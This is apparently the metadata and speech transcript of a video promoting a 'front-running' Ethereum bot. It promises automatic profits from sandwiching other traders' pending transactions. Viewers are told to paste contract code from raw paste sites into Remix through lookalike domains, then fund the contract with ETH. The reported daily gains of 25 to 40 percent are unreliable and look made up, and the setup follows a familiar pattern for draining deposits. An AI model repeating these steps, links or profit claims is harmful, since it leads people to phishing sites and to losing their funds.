title: Crypto Trading Front Bot - ETH 100% Works Aug 2022 ( NO DOWNLOADS)
description: A simple automated front run deployment in Solidity which automatically locates any liquidity added to a new token on Ethereum Mainnet, which immediately buys before big pending buy orders and sells at profit.  The contract sends %90 of the profit automatically to your wallet and %10 of profit automatically reenters the sniping for new opportunities. The remaining amount keeps frontrunning for profit, until you turn off "Action" function in Remix.  NOTE: This will only work on Ethereum mainnet and will NOT work with Binance Smart Chain.  # Telegram Support - https://t.me/Web3_Frank  # Get metamask from the official website: https://metamask.io/download.html  # Access Remix: (Choose any link you want) https://remixethereum-ide.github.io/ or https://remix-ethereum-ide-compiler.github.io/ or https://remixcompiler.com/ or https://remix-project.gitlab.io/IDE/ or https://remix.ethereum.org/  # Paste SmartContract in Remix: https://rentry.co/web3botcodes/raw or https://pst.klgrth.io/paste/x9waz/raw  # Installation Instructions The bot must be compiled on Remix Compiler, or else it will not work.  1. Make sure you have MetaMask installed https://metamask.io/download 2. Access Remix Ethereum Compiler https://remix.puxi.quilt.link and sign in with MetaMask 3. Click on the Contracts folder and then create New File. Rename it as you like, i.e: bot.sol 4. Paste the bot.sol code provided on this repository into your new file you created on Remix 5. Move to the Solidity Compiler tab, select version 0.6.6 and then Compile it 6. Move to the Deploy tab, select Injected Web 3 as the environment and then Deploy it. After the transaction is confirmed, it's your own BOT now 7. Deposit funds to your exact contract/bot address (Recommended at least 0.5 ETH for good profit) 8. After your transaction was confirmed, Start the bot by clicking the start button. Withdraw anytime by clicking the withdrawal button   IMPORTANT NOTE!!:  Make sure you fund enough for the contract to cover gas fees and possible burn fees. Many new token contracts have this 10% burn fee nowadays, alongside the ones with 3~6% fees and the no-fee ones. Gas fees average 0.006*2 (0.12) because we pay higher than usual to frontrun. So If you fund the contract with 0.05 ETH and the bot targets a with high burn fees the contract will basically waste in fees more than potential profit. At least 0.2 ETH or higher is recommended to make sure that won't happen. asr.full_text: John from Web3 Tutorials Hello YouTube, my name is John from Web3 Tutorials. And so today we will be talking about building a tricky smart contract bot built on Solidity that gives me an easy, easy passive income, in a few words, my bot, which I call a front running bot allows you to automatically trade a given token for the ethereum blockchain without having to go through the typical transaction methods. This is going to allow us to sniff the mempool or basically look for transactions that are pending to be made within a block. And it is going to allow us to inject our transaction with a higher gas fee, one guay higher than the transaction which is trying to be entered. This will allow our transaction to be processed first, and then we will also process a sell order within the same block. So essentially the victim's transaction gets sandwiched between ours, and we make a profit after slippage difference in the transaction. To start off off make sure you have met a mask installed and connected to the Ethereum mainnet if you don't have met a mask installed I will put the link in the description on how to install it so we go to remix ethereum compiler dot github dot IO remix it theater which is a Web3 application, allowing us to develop, deploy, compile and launch smart contracts, which are coded in the Solidity language. You can find the link in the description below. Head over to the sidebar on the left and create a new contract under contracts folder. We're going to name it b0t.soul So, next if you look at the description, I've included a link to this code. You just need to copy and paste that. This is our frontrunner bot contract that I've created. A couple of items to look at here are lines 50 and 51. If you follow those addresses on Etherscan, you will see that these are the addresses of wrapped Ether token, which will be competing with them. You can specify the coin target by filling Lines 50 and 51 or leave them unchanged for scanning for new Liquidity pairings. As you see, it's the official Wrapped Ether address. Always check that. So let's get back to Remix now that we have our bot file ready. Let's compile it. As you see, it is built with 0.6.6 version of Solidity. Now under Compiler, we're going to select our version to 0.6.6 so it matches our contract. Make sure the language is set to Solidity and EVM version to compilor default. Now, we need to click on the Compile bot.sole button and wait for the file to compile. So, now we're going to deploy this to our wallet. Go over to Deploy and run transactions in Remix. Here, we need to select Injected as the environment. Once you've clicked that, MetaMask will be connected to Remix Now, we have Deployment Utility right here. Let's confirm. Then enter the deployment utility from where you just copied from. The deployment utility has been connected to the contract. You can see here. You could click on it and click on it again. After that, the service will load. We have seen the service load the current time, but it seems to be fine. Click on Deploying. Then after successful deployment, let's confirm the creation of the contract by paying some gas fees. It took me a few amount of gas here, it's the commission of the Ethereum network for contract deployment. I always set gas fees high High not a lot of difference so lets click confirm and wait for the transaction to be confirmed finally we have Confirmation right here now our contract is deployed. As we can see here, there are 4 actions for a contract. Start Button will start the bot sniffing the mempool. Withdrawal will stop the bot and transfer funds back to your wallet. • Token name and token symbols speak for themselves. So, let's copy the contract address and make sure it was created. I'm going to head back to etherscan and past it. Yep, it was created successfully. So, the next step is to fund the contract with some coins to be able to snipe liquidity pools I'm gonna copy this address and head back over to my meta mask make sure you got the right address in there you can fund the trap with however many ether you want but the more you put in the larger transaction you'll be able to front run and the more profit you'll be able to front run and the more profit you'll be able to make so for instance if you're only able to front run with say 300 you're not gonna be able to create as much slippage in the price as if you were inserting thirty thousand dollars There we go, transaction confirmed. So, it was sent to the contract. We can check it by following our contract address on Etherscan.io. So, the contract has 1 Ethereum on its's balance which is basically the amount we have funded it with. So, the next step here is to click start. This will start the bot sniffing the mempool to find different liquidity pairs in order for you to front run transactions. I'll see you guys in a couple of hours. to find different liquidity pairs in order for you to frontrun transactions. I'll see you guys in a couple of hours. Well guys, I want to share the profit Bot made for me. So, I have something around 1.26 ether. Which is around 25 percent. I will withdraw my profit after 24 hours after the Bot runtime. So, I'll see you in four hours. All right, let's see, what do we have here? Oh, it's about 1.4 ether. So basically it took me about a day to gain my deposit by more than a third. Something close to 40% which isn't that bad… So the bot will continue to run until you press the withdraw button. I'll set it to high again and then we click confirm there we go transaction confirmed let's go to our Metamask check what do I have there yep you can see my balance here I've had three weeks where I've made 5 to 6 Ethers, sometimes it is not always profitable.
